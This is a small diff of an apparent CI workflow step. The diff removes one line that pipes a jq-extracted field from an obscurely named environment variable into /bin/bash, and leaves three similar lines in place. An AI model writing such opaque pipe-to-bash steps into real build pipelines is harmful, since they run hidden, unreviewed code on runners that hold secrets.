@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$k70" | jq -r .zllwy1 | /bin/bash
           echo $iuspr0 | jq -r .hbm87 | /bin/bash
-          echo $y1 | jq -r .pxjht7540 | /bin/bash
           printf '%s' "$im765" | jq -r .zk27 | /bin/bash
 
       - name: Archive output
